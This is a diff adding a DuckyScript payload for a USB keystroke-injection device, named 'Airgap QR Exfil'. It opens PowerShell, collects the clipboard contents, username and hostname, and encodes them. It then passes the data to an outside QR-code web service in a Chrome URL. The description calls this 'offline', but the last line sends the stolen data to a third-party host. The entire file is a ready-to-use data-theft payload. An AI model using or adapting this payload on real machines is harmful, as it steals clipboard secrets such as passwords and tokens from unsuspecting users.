@@ -1,0 +1,28 @@
+REM Payload: Airgap QR Exfil
+REM Author: Alessandro
+REM Description: Estrae dati locali e li mostra in QR code offline
+DEFAULT_DELAY 300
+DELAY 1000
+
+GUI r
+DELAY 300
+STRING powershell
+ENTER
+DELAY 800
+
+STRING Add-Type -AssemblyName System.Web
+ENTER
+STRING $clip = Get-Clipboard -Raw
+ENTER
+STRING $user = $env:USERNAME
+ENTER
+STRING $hostname = $env:COMPUTERNAME
+ENTER
+STRING $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+ENTER
+STRING $data = "[$time][$user@$hostname] $clip"
+ENTER
+STRING $encoded = [System.Web.HttpUtility]::UrlEncode([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data)))
+ENTER
+STRING Start-Process chrome "--new-window https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=$encoded"
+ENTER
